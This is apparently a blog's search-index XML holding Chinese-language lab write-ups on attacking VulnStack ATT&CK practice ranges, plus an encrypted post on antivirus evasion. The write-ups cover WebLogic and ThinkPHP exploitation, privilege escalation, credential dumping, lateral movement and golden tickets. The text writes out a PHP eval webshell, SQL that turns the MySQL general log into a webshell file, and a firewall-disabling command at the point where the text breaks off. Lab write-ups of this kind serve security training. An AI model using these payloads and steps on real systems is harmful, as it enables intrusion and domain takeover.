<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>VulnStack ATT&amp;CK 2 靶场</title>
      <link href="/2020/04/18/vulnstack-att-ck-2-ba-chang/"/>
      <url>/2020/04/18/vulnstack-att-ck-2-ba-chang/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnStack-ATT-amp-CK-2-靶场"><a href="#VulnStack-ATT-amp-CK-2-靶场" class="headerlink" title="VulnStack ATT&amp;CK 2 靶场"></a>VulnStack ATT&amp;CK 2 靶场</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418141833.png-water_print" alt=""></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap-端口扫描"><a href="#nmap-端口扫描" class="headerlink" title="nmap 端口扫描"></a>nmap 端口扫描</h3><pre><code>PORT      STATE SERVICE       VERSION80/tcp    open  http          Microsoft IIS httpd 7.5| http-methods:|   Supported Methods: OPTIONS TRACE GET HEAD POST|_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/7.5|_http-title: Site doesn't have a title.135/tcp   open  msrpc         Microsoft Windows RPC139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds  Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds1433/tcp  open  ms-sql-s      Microsoft SQL Server 2008 R2 10.50.4000.00; SP2| ms-sql-ntlm-info:|   Target_Name: DE1AY|   NetBIOS_Domain_Name: DE1AY|   NetBIOS_Computer_Name: WEB|   DNS_Domain_Name: de1ay.com|   DNS_Computer_Name: WEB.de1ay.com|   DNS_Tree_Name: de1ay.com|_  Product_Version: 6.1.7601| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Issuer: commonName=SSL_Self_Signed_Fallback| Public Key type: rsa| Public Key bits: 1024| Signature Algorithm: sha1WithRSAEncryption| Not valid before: 2020-04-18T03:37:19| Not valid after:  2050-04-18T03:37:19| MD5:   83a6 3f23 de4f e053 4224 f66c a547 3223|_SHA-1: 0aad 0382 de96 c9da 3990 3014 360c 7f31 bf78 a3df|_ssl-date: 2020-04-18T06:12:57+00:00; -2s from scanner time.3389/tcp  open  ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info:|   Target_Name: DESKTOP-DUNPKQ9|   NetBIOS_Domain_Name: DESKTOP-DUNPKQ9|   NetBIOS_Computer_Name: DESKTOP-DUNPKQ9|   DNS_Domain_Name: DESKTOP-DUNPKQ9|   DNS_Computer_Name: DESKTOP-DUNPKQ9|   Product_Version: 10.0.17763|_  System_Time: 2020-04-18T06:12:19+00:00| ssl-cert: Subject: commonName=DESKTOP-DUNPKQ9| Issuer: commonName=DESKTOP-DUNPKQ9| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2020-02-23T21:21:14| Not valid after:  2020-08-24T21:21:14| MD5:   5cb3 a3dd 4a5e eb67 80d5 8f39 633f d11b|_SHA-1: 9694 4630 239e d821 3658 976c 40a1 6d3b d9b4 e80f|_ssl-date: 2020-04-18T06:12:57+00:00; -2s from scanner time.7001/tcp  open  http          Oracle WebLogic Server (Servlet 2.5; JSP 2.1)|_http-title: Error 404--Not Found49152/tcp open  msrpc         Microsoft Windows RPC49153/tcp open  msrpc         Microsoft Windows RPCService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: -1h08m35s, deviation: 3h01m23s, median: -2s| ms-sql-info:|   192.168.3.242:1433:|     Version:|       name: Microsoft SQL Server 2008 R2 SP2|       number: 10.50.4000.00|       Product: Microsoft SQL Server 2008 R2|       Service pack level: SP2|       Post-SP patches applied: false|_    TCP port: 1433| smb-os-discovery:|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1|   Computer name: WEB|   NetBIOS computer name: WEB\x00|   Domain name: de1ay.com|   Forest name: de1ay.com|   FQDN: WEB.de1ay.com|_  System time: 2020-04-18T14:12:22+08:00| smb-security-mode:|   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode:|   2.02:|_    Message signing enabled but not required| smb2-time:|   date: 2020-04-18T06:12:20|_  start_date: 2020-04-18T03:37:46</code></pre><p>发现 <code>7001</code> 端口的 <code>weblogic</code>，访问 <code>http://192.168.3.242:7001/console</code>，版本号为：<code>10.3.6.0</code></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418142154.png-water_print" alt=""></p><p>使用 <code>weblogicScanner</code> 扫描 <code>weblogic</code> 服务器，发现 <code>cve-2019-2725</code> 漏洞。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418143254.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418143113.png-water_print" alt=""></p><p>上传一个 <code>webshell</code> 方便后续操作。</p><p>关于 <code>weblogic</code> 上传路径的问题，可以参考 <a href="https://www.cnblogs.com/sstfy/p/10350915.html" target="_blank" rel="noopener">https://www.cnblogs.com/sstfy/p/10350915.html</a></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418144416.png-water_print" alt=""></p><p>冰蝎连接：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418144812.png-water_print" alt=""></p><p>上传 cs 木马：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418145040.png-water_print" alt=""></p><p>执行：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418145356.png-water_print" alt=""></p><p>之前发现是域用户，<code>ipconfig</code> 看下 ip：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418145823.png-water_print" alt=""><br>发现该机器为双网卡，且内网为 <code>10.10.10.xx</code> 网段。</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="dump-密码"><a href="#dump-密码" class="headerlink" title="dump 密码"></a>dump 密码</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418150519.png-water_print" alt=""></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>使用 <code>ms-14-058</code> 提权到 <code>SYSTEM</code> 权限方便进一步操作：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418150703.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418150745.png-water_print" alt=""></p><h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><h4 id="查看域名"><a href="#查看域名" class="headerlink" title="查看域名"></a>查看域名</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418154346.png-water_print" alt=""></p><h4 id="查看域内主机"><a href="#查看域内主机" class="headerlink" title="查看域内主机"></a>查看域内主机</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418151926.png-water_print" alt=""></p><h4 id="查看域内用户"><a href="#查看域内用户" class="headerlink" title="查看域内用户"></a>查看域内用户</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418151813.png-water_print" alt=""></p><h4 id="查看域控"><a href="#查看域控" class="headerlink" title="查看域控"></a>查看域控</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418154740.png-water_print" alt=""></p><h4 id="查看域管"><a href="#查看域管" class="headerlink" title="查看域管"></a>查看域管</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418152203.png-water_print" alt=""></p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>利用 <code>PsExec</code> 横向移动至 <code>DC</code>：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418155307.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418155327.png-water_print" alt=""></p><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><h4 id="域控上的信息收集"><a href="#域控上的信息收集" class="headerlink" title="域控上的信息收集"></a>域控上的信息收集</h4><p>抓取 <code>krbtgt</code> 的 <code>hash</code>：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418155705.png-water_print" alt=""></p><h4 id="制作黄金票据"><a href="#制作黄金票据" class="headerlink" title="制作黄金票据"></a>制作黄金票据</h4><p>注入票据前：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418160203.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418160142.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418160150.png-water_print" alt=""></p><p>注入票据后：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200418161451.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnStack ATT&amp;CK 1 靶场</title>
      <link href="/2020/04/16/vulnstack-att-ck-1-ba-chang/"/>
      <url>/2020/04/16/vulnstack-att-ck-1-ba-chang/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnStack-ATT-amp-CK-1-靶场"><a href="#VulnStack-ATT-amp-CK-1-靶场" class="headerlink" title="VulnStack ATT&amp;CK 1 靶场"></a>VulnStack ATT&amp;CK 1 靶场</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416115230.png-water_print" alt=""></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416115357.png-water_print" alt=""></p><p>只开放了<code>80</code>、<code>3306</code></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>访问 80 端口，发现首页为 <code>PHP</code> 探针：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416115600.png-water_print" alt=""></p><p>目录扫描：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416115450.png-water_print" alt=""></p><p>发现 phpmyadmin。</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>phpmyadmin 尝试若口令登录：<br><code>root:root</code> 登录成功。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416115724.png-water_print" alt=""></p><p>phpmyadmin 后台的 getshell 方法有很多种<br>先看下常规的 <code>select into outfile</code>：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416115754.png-water_print" alt=""></p><p>这里 <code>secure_file_priv</code> 为 <code>null</code>，不允许写入写出。<br>放弃此方法，尝试 <code>MySQL</code> 通用查询日志 <code>general_log</code> 写出 <code>webshell</code>。<br>先看下全局变量的配置 <code>show global variables like '%general%'</code> ：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416115844.png-water_print" alt=""></p><p>这里并没有开启通用日志，那我就自己打开，并自定义保存文件：</p><pre class=" language-SQL"><code class="language-SQL">SET GLOBAL general_log = 'ON'SET GLOBAL general_log_file = 'C:/phpStudy/WWW/shell.php'</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416120022.png-water_print" alt=""></p><blockquote><p>这里的绝对路径是通过前面的探针获取到的。</p></blockquote><p>然后写 webshell <code>select '&lt;?php @eval($_POST["bbll]);?&gt;'</code>：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416120045.png-water_print" alt=""></p><p>蚁剑连接：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416120108.png-water_print" alt=""></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>首先查看系统位数：</p><pre class=" language-cmd"><code class="language-cmd">wmic cpu get addresswidth</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416120239.png-water_print" alt=""></p><p>用 cs 生成木马，上传：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416120319.png-water_print" alt=""></p><p>执行：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416120340.png-water_print" alt=""></p><p>上线，直接是管理员权限：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416120400.png-water_print" alt=""></p><p>查看用户权限：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416120421.png-water_print" alt=""></p><p>查看当前登录域：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416120653.png-water_print" alt=""></p><p>查看域内用户：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416120848.png-water_print" alt=""></p><p>查看域内主机：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416120908.png-water_print" alt=""></p><p>查看域管：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416120941.png-water_print" alt=""></p><p>dump 密码：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416121030.png-water_print" alt=""></p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416121203.png-water_print" alt=""></p><p>DC 上线后，使用 <code>hashdump</code> dump krbtgt NTLM Hash：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416121319.png-water_print" alt=""></p><p>制作黄金票据：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200416121339.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过替换 cobaltstrike 中自带 loader 进行免杀</title>
      <link href="/2020/04/02/tong-guo-ti-huan-cobaltstrikes-zhong-zi-dai-loader-jin-xing-mian-sha/"/>
      <url>/2020/04/02/tong-guo-ti-huan-cobaltstrikes-zhong-zi-dai-loader-jin-xing-mian-sha/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="0f67887181824ec3d13e2e7a1fdaf64cb6e10e3d0ebb862ff6652f36863fdd7a">716c626f9ed426c7ab586a912d51a5e7a7a436ff1f1f9cb60eeb5e12a229683bea5dfbed7f23f789760d7606e161913f954c056c57b92df4cfb9e2aa4fd69580e184964abd26fd190c554c97587b8e048c0594cc4b87a4976aa773d97567dca2cff97d0fcf8f879935386b10fefff11e71664567a0320a79e3282d9946af0cbef9e34866ae0c45034a289eeaec840d4e81c178a0b206d97f53a38c35730a700d3dba4b28fe7bb50e403afff2ce79efee3f40bda2ff3028a8b261d61651d19c2b6d86abd32c9d448105bdabfef735a811a695a42db78a5c419a0536b1ac369f8738e99ed24b05356aa5e04523faf8bf21c145b2b88d6111942fdb1722b5e936a9d3e9ff360e68ec3a60df386eb37d5ef36b446d86cbe38a56029d0bcae74b1a806bf235fda796343f40105f941f3e7a9e7246f923c1348774b201332d82ba97816976d385c8eda7ed50b36400d7ee565f51cda47b23f0a9d0c49458667b01439fff317b4a14af1aada040c8d0da85857647217d7cf70912c8e4b1098356a9e42d95ae3c49ab754f0bd43cdbbb326605fa1f4702c4e514f8f283da60550cc5c1951656d24a767985720c6afafe41a9cd10798071de05b843e013c9493322488240cc73180935d646eff5300803f3ae39d4fc4172f6b96f5555f5cceb17b6e0c83dd08d269f535ca4921bb150a797ab258e606a22cae513e60d4b40e85f32f831a35dfb17b567a147bb7f8495d7405ef1582c992fd9935895718382713a531a7e120f45535960388132fa3b39bb0749f4a8ab5204900d6cb2552bc1f1cb5e7b6efc0a68e88ee66953e01ba19ca09dd0bb45fbf222af47075aa34bafdabf36c17be046f5acc78cd80a7cd45412428e239bddcafafaeea625c88c7128b869014844c64a20c5d4e124a26925a04eb51dbc8c37734d8df5357e143ac51cc8b3cc2c2fc83f6114b814d5ba9e8595a27662a72b2a0ba5b70e3beb8bec5c988df05b7e7ba8613c247c4abe7d76f61025784fc419cdedebeaa7f29acd1eba110bc7a72463b2129898bb90113987201b905bc1966566ea0b444c930648a96cfac398a7e998466d931d9a95db74f3843cd78266a784f183bfc76668d14295a3b9eb09af2117e9b3ba623a35987977e1e8e8c94640bf74e64fefaa42978ca0c748ab36712014e4a6c4a2be5e2e8b47f17346416d8853b6e385d1a8da4498c4511e2d17861eae7aa93fd33791b182839e37c9a2fa103f9616b5c2907d81c8ff7ab342c24f790954ec6eb7b07acd6b2f14d54cd359072f6b48539da16a928c272b3c76f2759cb49e089f287d61681be033bd5f28266e73826e3cf7fe3323d732f4d2bd3ec494685dd1a28675c9a1a01a91b08623bf3ba04c5c0e911f5c782305358b7a68fdc7c98128c1ce7c9e46f464459118072be89cd9e3a292f14174b76e30448cf5d6454e2763f261b057d6e47a14fcfb944a0b08cacf6e2a68c6c73cffd531677dacc396034cd0a5d85da86f0a417d925b1bd28aebdc778d6efd805a84d4b916e29d94b9668bf817e3f94f152eb85e755bbeb5de61b564e3ee3d811b0085bf6b36b9fed6e444a33c717b954c2afaad59c974db09f02d3a3115cdc6195733d6c769f4d2889380d2fb52e70720289d528e70ef9dca6138228da9c32f8e480935d025a82dfe7485544bb5b20c3c75b1fcd24f8740b9cc51a22b1695978265c89705d4b1a256c41cddc73c47bb8f16132bf0a0672b755851a9710b80d7497288ecba1c219ddc9e42b56a51416543f1f41b80d6e2c990b3e364dc1d95d3caf0c09c56e9475f42b438739cfdc75beead01886fdf64939e8411483b208dd003839216cb1826810430855a268a23861276fd4a6e03fcbe9fb336e96ac4a25937c9a532c658a8c669cc4fe4e00e2638437eac578ff47fa93ba54234ceeeb53ce7298f5a699afadf8c22e390d857017bd823fb42af5a0dcb25867b142b423e920350d72297b891558b868b312fe50ba84b0ecc6dd55b7d4b6222a930c4a47b1edd43f09256362150538486c445d544213c7c19d2eca79575400b15bdac6f1bee53571c7044a566345e1651aa7aad3fbf3d53367f48cc6b4fb9d6dc5bbf05270c3af6992fd5065aeb87296c594bccca197482f90eeaffefee845835078d48f1550822a6b4e4a71b84a300a8c407210c9e0de795080117e4d5aade2153750fcf775c94516fd5c1981afdd692cb9974e2ac75896b32c049f0ca70b9f1be33b9b9423fd2830a7fbd3ef478bda10c9fb0e73d63514d70703b84f36baeeda07aad4bbe6e4a4362e3f4214cde1d2fb216da5023f419a4860d7908a9e9034d7bf5b80c90c254af6f9f8963d0e3eb6f7e5246c0807c14515c19bae766210897917cddd089b299fea44256aa9aa26d602d42853a94e3e82f3d65d7ba8be23d80583695351bb73f731e1b57db7554762f2b9361d316cc6a87c7dc9f2ed0fb85e2fcf797e64af997cb8db21c85f0ea9299dfa281f2d018e24dda4f4db7892ad0f9741ccfbec74c9ed072f0499090bf30be23d41e07496b795412450fc7e50129f3af52700ca9d61b6d61f4562674a784b50aeb91f952a52c6224b51ea38149ede034c3cdfc97143ff83cb257811ff723fbb6d39edc6bef4a2c816d39fbca97d848164830cd948d1fc02013080f5c5dbb90c49b27cedab3714f2489ed0636b99c9433d2a2ebd4e539ce18195b2528da6099af874aca27d4f9221b650fe07f43ad5ad9b61843d30029d199774707e7670504cd43a01ee3ddd78766c762f16e2d3ea0864d1933271597eb4207d1362ab5c48ceb7864931a27e176e1158b1387f81b30aaf09211e169104b895c20f10593561053dc61dbba9c2c785a42f633df801ff0325498117ec335f09878424ea2b7daf5562e9137bc3ad16f85aab6be73c951183ceb12eb74b0fd2c949c79b3dab93e06dfa3e3d2d026f096b0e792e49ab98468f0ad338a87d3dfa515bb18a5b4a2f1e61657fa73d1c919998e2fed5ee81258d6fd416e7de78324cd578fc3c45f917ea61d20577f13235fdfb135a00a4c033fa84c76ea9d064adc373e2d817f599125eee837958e9526acf7248678a680019d5e9b01fdcb509550bc67ef559bfad607459230d48be82ae4a6197224b98c7d7a2dd4bb7b15f13e0f9c87e09440d009773b3a3b0351f77735b8aeb8fc7f6c3ec5313835433a15a5fb4fcfa46399ecf0643a9529a585a97c897c4b528e3943d7dee109950b9cf6a1c2390e9be8ff9aeaeb4e4e9781cc545c9ae02bc4e237b201e99ad1c1f5ba87607e42f70fe3af97337b288307bdc96a72e2d69d6abd924c70adb4c11df9a99cc10d123bfee978cace82f581342b87852ef1bf78b1b872cbc189142a0fd59ac1517237a633757cc5b9cdc133f46a3e4cb282bd3fc34d43f4e556883411c7e7db20f1d2e284a87bfa9b5961dd82da8a1ca7c79964e141d0273ff3b05e035295531840f3d0c0ac4c64c6649d3f773b86a9cd8b45121ffbfbf687a8ef2e7dbe1ebf1e5cccb0f555eadf7b77801f5ad21cd6fb08171b29aee224136a40213d10f547baa531bf6fcda1c3e26d4f864bf6fe8da2c4e8dd8828e28bb41cdaaab4ec617250f40544b754e566e9fbf05afefa46d18750b44d2523aad8554010ed2e22c5ad3ee727bbda73d06d85d4cd8bb9753f4ad7d68cddef8ef934099a0356ab9f81b6feda36b8a07ca9d11a00eb276615a19adc443137d0936d80cea445f14d76e25d1152b93914d7b1e03193c7bba56979b4ffb01bc0edc40762c30979450dc5fdd47dc248d263cb6d7199f00cef05b22a19af996099e270f79db4399ffaf986edadb956b37baf63628570089d59a28f30aec4f7e95a49060b38e07af0c5f79de1eb7ee0b588e06d89f1c6ccffac6db866825f0fa4cb6b0a33d4bccac90eeaf3ff5e2e20740e38be5d4b3708cceb451c561081def06c1dae9c5524366413d9319857be41b72826e7ef7cad0d952f4310b3e2e68d7feb67301e468be11406830226b28620372cab92aee6c526ef660ea1519d88eed5fd228563baa83477ab34f04aae35a3157e09e174157c600003feae2d266c01c82a0ed82f30ff7a1458e6fa355e6c193ca4c6ac38c298c7f8508412ac7b19c0d98398c2755bb0f7ccf41be251995a4f501e460f943f7b0e77b25efafaa1ef33ed5ef73769f4fee5045aa66c4c2d19c0e39a08602883a38943459f7ac730ee30864f9c09c0258ea06cbed3fc3182bb1a72030ac8551f2906417dc4a03afe7322db4fbafc314a5d473954a79a9c143655a9dbac735ca70b731033a8add478e550ce673379641665366360c8621dcb02f336ed1e13e242491c62a486a2555dcd837764fd6cbbe9736d6c479680efd104bd7b244f5440079a139e3e855ebe401bfc314d80e7167ba4053373a8e2f278eb84a43f9937cf03ce1442ff480a52d38e9e87ee658aeb479c2879c4e9bc32c176c82ffaae19b28569f2ece9806dd602fef67ab64eb1510314ba0a17826e018ae9f292feeb6ece725fc61f540aa075ed893f7bf09548c4232819</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> cobaltstrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnStack ATT&amp;CK 5 靶场</title>
      <link href="/2020/03/23/vulnstack-att-ck-5-ba-chang/"/>
      <url>/2020/03/23/vulnstack-att-ck-5-ba-chang/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnStack-ATT-amp-CK-5-靶场"><a href="#VulnStack-ATT-amp-CK-5-靶场" class="headerlink" title="VulnStack ATT&amp;CK 5 靶场"></a>VulnStack ATT&amp;CK 5 靶场</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>利用 nmap 扫描端口,发现开启了两个端口: 80 和 3306<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323152943.png-water_print" alt=""></p><p>访问 80 端口 发现是 thinkphp v5 的站</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323143842.png-water_print" alt=""></p><p>随便访问一个错误页面得到其版本号是 5.0.22</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323143851.png-water_print" alt=""></p><h3 id="漏洞搜索"><a href="#漏洞搜索" class="headerlink" title="漏洞搜索"></a>漏洞搜索</h3><p>searchsploit 搜索相关漏洞：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323144520.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323144508.png-water_print" alt=""></p><p>尝试使用 EXP 执行命令 <code>ipconfig</code>, 如下图所示:<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323144530.png-water_print" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>查看权限：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323153315.png-water_print" alt=""></p><p>查看 web 目录：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323153239.png-water_print" alt=""></p><p>写入shell：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323153256.png-water_print" alt=""></p><h3 id="生成远控"><a href="#生成远控" class="headerlink" title="生成远控"></a>生成远控</h3><h4 id="新建-listener"><a href="#新建-listener" class="headerlink" title="新建 listener"></a>新建 listener</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323153614.png-water_print" alt=""></p><h4 id="生成-payload"><a href="#生成-payload" class="headerlink" title="生成 payload"></a>生成 payload</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323153650.png-water_print" alt=""></p><h3 id="上传远控"><a href="#上传远控" class="headerlink" title="上传远控"></a>上传远控</h3><p>连接 webshell：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323153444.png-water_print" alt=""></p><p>上传：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323153734.png-water_print" alt=""></p><p>执行：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323153800.png-water_print" alt=""></p><p>反弹回的 shell：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323153834.png-water_print" alt=""></p><p>执行 <code>shell whoami</code>：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323160308.png-water_print" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>再新建一个 <code>listener</code>，做为提权等操作使用<br>(<code>smb</code> 和 <code>tcp</code> 都可以，我选择 <code>tcp</code>, <code>smb</code> 适合横向)</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323161941.png-water_print" alt=""></p><p>作者在 cs4.0 移除了漏洞exp的提权，可在<a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener">https://github.com/rsmudge/ElevateKit</a> 重新添加到 cs 中。</p><p>使用的是 <code>ms14-058</code> 漏洞的 exp 进行提权：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323162110.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323162356.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323162402.png-water_print" alt=""></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>通过 <code>explore-Process List</code> 先查看一下进程，看看有没有杀毒软件(在local system操作)</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323162658.png-water_print" alt=""></p><p>发现并没有杀毒软件，这样我们日后的横向移动活动将更为顺利。</p><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><p>使用命令 <code>netsh advfirewall set 